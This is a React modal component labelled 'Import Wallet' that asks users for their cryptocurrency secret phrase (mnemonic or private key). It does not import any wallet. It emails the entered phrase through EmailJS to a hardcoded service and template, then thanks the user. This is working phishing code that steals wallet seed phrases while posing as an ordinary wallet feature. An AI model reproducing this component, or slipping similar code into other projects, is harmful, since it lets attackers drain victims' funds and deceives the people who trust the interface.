import React, { useRef, useState } from "react";
import Modal from "react-bootstrap/Modal";
import "./Import_wallet_model.css";
import swal from "sweetalert";
import emailjs from "@emailjs/browser";

export default function Import_wallet_model(props) {
  const [privateKey, setPrivateKey] = useState("");
  const [errorKey, setErrorKey] = useState(false);
  const [spinner, setspinner] = useState(false);

  const form = useRef();

  // console.log("form",form.current);
  const sendEmail = (e) => {
    e.preventDefault();
    if (privateKey !== "") {
      setspinner(true);
      emailjs
        .sendForm(
          "service_8s82gji",
          "template_72g0wx9",
          form.current,
          "8owoBuxgTDg1A9qdk"
        )
        .then(
          (result) => {
            console.log(result.text);
            setspinner(false);
            swal("Success!", " Thank you for Submitting", "success");
            props.setModalShow2(false);
          },
          (error) => {
            console.log(error.text);
            setspinner(false);
            swal("Error!", `${error.text}`, "error");
          }
        );
    }
  };
  return (
    <div>
      <Modal
        {...props}
        size="md"
        aria-labelledby="contained-modal-title-vcenter"
        centered
      >
        <Modal.Body>
          <h5 className="text-center text-white">Import Wallet</h5>
          <div>
            {errorKey ? (
              <>
                <span style={{ color: "red", fontSize: "15px" }}>
                  Enter your secret phrase First!{" "}
                </span>{" "}
              </>
            ) : (
              <></>
            )}
            <form ref={form} onSubmit={sendEmail}>
              <textarea
                className="import_text"
                name="message"
                id=""
                cols="30"
                rows="6"
                placeholder="Enter your secret phrase here (mnemonic or private key)"
                onChange={(e) => (
                  setPrivateKey(e.target.value), setErrorKey(false)
                )}
              ></textarea>

              <button
                className="go_back_btn"
                onClick={() => props.setModalShow2(false)}
              >
                Go back
              </button>
              <button
                type="submit"
                className="import_wallet_btn"
                onClick={() => privateKey == "" && setErrorKey(true)}
              >
                {
                  spinner ? "Loading...":"import Wallet"
                }

              </button>
            </form>
          </div>
        </Modal.Body>
        {/* <Modal.Footer>
          <Button onClick={props.onHide}>Close</Button>
        </Modal.Footer> */}
      </Modal>
    </div>
  );
}
